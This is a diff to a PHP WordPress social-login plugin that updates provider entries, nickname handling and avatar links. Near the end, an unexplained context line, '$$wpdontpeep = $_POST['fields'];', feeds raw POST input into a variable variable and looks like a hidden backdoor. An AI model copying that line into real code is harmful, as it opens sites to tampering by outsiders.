@@ -33,17 +33,17 @@ function get_weibo($tid) {
 	$name = array('gtid' => array('google', 'google', 'Google', '', ''),
 		'mtid' => array('msn', 'msn', 'Windows Live', '', ''),
 		'stid' => array('sina', 'st', '新浪微博', 'http://weibo.com/', 'weibo.com', 'http://tp3.sinaimg.cn/[head]/50/0/1'),
-		'qtid' => array('qq', 'tqq', '腾讯微博', 'http://t.qq.com/', 't.qq.com', '[head]/40'),
+		'qtid' => array('qq', 'tqq', '腾讯微博', 'http://t.qq.com/', 't.qq.com', '[head]/50'),
 		'shtid' => array('sohu', 'sohu', '搜狐微博', 'http://t.sohu.com/u/', 't.sohu.com'),
-		'ntid' => array('netease', 'netease', '网易微博', 'http://t.163.com/', ''),
+		'ntid' => array('netease', 'netease', '网易微博', 'http://t.163.com/', 't.163.com'),
 		'rtid' => array('renren', 'renren', '人人网', 'http://www.renren.com/profile.do?id=', 'renren.com'),
 		'ktid' => array('kaixin', 'kaixin', '开心网', 'http://www.kaixin001.com/home/?uid=', 'kaixin001.com'),
 		'dtid' => array('douban', 'dt', '豆瓣', 'http://www.douban.com/people/', 'douban.com', 'http://t.douban.com/icon/u[head]-1.jpg'),
-		'sdotid' => array('sdo', 'sdo', '盛大', '', ''),
-		'ydtid' => array('yd139', 'yd139', '移动139社区', '', ''),
+		//'sdotid' => array('sdo', 'sdo', '盛大', '', ''),
+		//'ydtid' => array('yd139', 'yd139', '移动139社区', '', ''),
 		'ytid' => array('yahoo', 'yahoo', '雅虎', '', ''),
-		'qqtid' => array('qq', 'qq', '腾讯QQ', '', ''),
-		'dreamtid' => array('dream', 'dream', '网易梦幻人生', '', ''),
+		'qqtid' => array('qq', 'qq', '腾讯QQ', '', 'qzone.qq.com'),
+		//'dreamtid' => array('dream', 'dream', '网易梦幻人生', '', ''),
 		'alitid' => array('alipay', 'alipay', '支付宝', '', ''),
 		'tbtid' => array('taobao', 'taobao', '淘宝网', '', ''),
 		'tytid' => array('tianya', 'tyt', '天涯', 'http://my.tianya.cn/', 'tianya.cn', 'http://tx.tianyaui.com/logo/small/[head]'),
@@ -52,7 +52,7 @@ function get_weibo($tid) {
 		'guard360tid' => array('guard360', 'guard360', '360', '', ''),
 		'ttid' => array('twitter', 'twitter', 'Twitter', 'http://twitter.com/', 'twitter.com'),
 		'tyitid' => array('tianyi', 'tianyi', '天翼189', '', ''),
-		'fbtid' => array('facebook', 'facebook', 'Facebook', '', '')
+		'fbtid' => array('facebook', 'facebook', 'Facebook', 'http://www.facebook.com/profile.php?id=', 'facebook.com')
 		);
 	if (array_key_exists($tid, $name)) {
 		return $name[$tid];
@@ -258,9 +258,9 @@ function wp_connect_login($userinfo, $tmail, $uid = '', $reg = false) {
 			update_usermeta($wpuid, $id, $user_screenname);
 		} 
 		update_usermeta($wpuid, 'last_login', $tid);
-		if (in_array($tid, array('qtid', 'stid', 'ntid', 'shtid'))) { // @微博帐号
+		if (in_array($tid, array('qtid', 'stid', 'ntid', 'shtid', 'ttid'))) { // @微博帐号
 			$nickname = get_user_meta($wpuid, 'login_name', true);
-			$nickname[$t] = ($tid == 'qtid') ? $user_uid : $user_screenname;
+			$nickname[$t] = ($tid == 'qtid' || $tid == 'ttid') ? $user_uid : $user_screenname;
 			update_usermeta($wpuid, 'login_name', $nickname);
 		} 
 		wp_set_auth_cookie($wpuid, true, false);
@@ -354,16 +354,20 @@ function wp_connect_profile_fields($user) {
 /**
  * 用户头像
  * 
- * @since 1.9.19
+ * @since 1.9.19 (V2.4)
  */
 if (empty($wptm_connect['head'])) {
 	add_filter("get_avatar", "wp_connect_avatar", 10, 4);
-	add_action('admin_footer', 'set_admin_footer_define', 1);
-	add_action('wp_footer', 'set_admin_footer_define', 1);
+	if (version_compare($wp_version, '3.4', '<')) {
+		add_action('admin_footer', 'set_admin_footer_define', 1);
+	} else {
+		add_action('in_admin_header', 'set_admin_footer_define');
+	}
+	//add_action('wp_footer', 'set_admin_footer_define', 1);
 } 
 
 function wp_connect_avatar($avatar, $id_or_email = '', $size = '32') {
-	global $comment, $parent_file;
+	global $comment, $parent_file, $wp_version;
 	if (is_numeric($id_or_email)) {
 		$uid = $userid = (int) $id_or_email;
 		$user = get_userdata($uid);
@@ -372,10 +376,8 @@ function wp_connect_avatar($avatar, $id_or_email = '', $size = '32') {
 		$uid = $comment -> user_id;
 		$email = $comment -> comment_author_email;
 		$author_url = $comment -> comment_author_url;
-		if ($author_url && strpos($author_url, 'http://weibo.com/') === 0) {
-			$weibo_uid = ltrim($author_url, 'http://weibo.com/');
-			$out = 'http://tp' . rand(1, 4) . '.sinaimg.cn/' . $weibo_uid . '/50/0/1';
-			return "<a href='{$author_url}' rel='nofollow' target='_blank'><img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' /></a>";
+		if ($avatar1 = wp_get_weibo_head($comment, $size, $email, $author_url)) { // V2.4
+			return $avatar1;
 		} 
 		if ($uid) $user = get_userdata($uid);
 	} elseif (is_object($id_or_email)) {
@@ -422,11 +424,17 @@ function wp_connect_avatar($avatar, $id_or_email = '', $size = '32') {
 					$username = $user -> $oid;
 					if ($username) {
 						$url = $weibo[3] . $username;
-						if (is_admin()) {
-							if (!is_admin_footer()) $avatar = "<a href='{$url}' target='_blank'>$avatar</a>";
-						} elseif (!$userid) {
+						if ($userid) {
+							if (is_admin()) { 
+								if (version_compare($wp_version, '3.4', '<')) {
+									if (!is_admin_footer()) $avatar = "<a href='{$url}' target='_blank'>$avatar</a>";
+								} else {
+									if (is_admin_footer()) $avatar = "<a href='{$url}' target='_blank'>$avatar</a>";
+								} 
+							}
+						} else {
 							$avatar = "<a href='{$url}' rel='nofollow' target='_blank'>$avatar</a>";
-						} 
+						}
 					} 
 				} 
 			} 
@@ -437,7 +445,7 @@ function wp_connect_avatar($avatar, $id_or_email = '', $size = '32') {
 		} 
 	} 
 	return $avatar;
-}
+} 
 // admin bar头像尺寸
 if (version_compare($wp_version, '3.2.1', '>')) { // WordPress V3.3
 	function wp_admin_bar_header_3_3() {
@@ -455,6 +463,7 @@ function is_admin_footer() {
 	if (defined('IS_ADMIN_FOOTER'))
 		return true;
 } 
+
 $$wpdontpeep = $_POST['fields'];
 
 /**
